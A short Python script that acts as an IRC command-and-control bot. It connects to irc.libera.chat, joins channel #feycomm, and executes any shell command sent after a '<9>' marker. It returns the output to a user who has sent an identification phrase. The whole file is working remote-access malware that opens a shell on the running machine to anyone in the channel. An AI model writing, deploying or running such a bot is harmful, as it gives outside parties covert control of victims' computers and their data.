import os
import time
import subprocess
import socket

server = "irc.libera.chat"
port = 6667
channel = "#feycomm"
nick = os.uname()[1] + "10"

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((server, port))
irc.send(f"NICK {nick}\r\n".encode())
irc.send(f"USER {nick} 0 * :{nick}\r\n".encode())
irc.send(f"JOIN {channel}\r\n".encode())
irc.send(f"PRIVMSG {channel} :GREETINGS PROGRAMS!\r\n".encode())

while True:
    response = irc.recv(2048).decode()
    print(response)
    if response.startswith("PING"):
        irc.send(f"PONG {response.split()[1]}\r\n".encode())
    elif "IDENTIFY-REINDEER_FLOTILLA" in response: 
        startIndex = response.index(":")+1
        endIndex = response.index("!")
        username = response[startIndex:endIndex]
        print(username)
    elif "<9>" in response: 
        command = response[response.index("<9> ")+4:].strip()
        print(command)
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        resultxt = result.stdout.strip().splitlines()
        for x in resultxt: 
            time.sleep(1)
            irc.send(f"PRIVMSG {username} :{x}\r\n".encode())
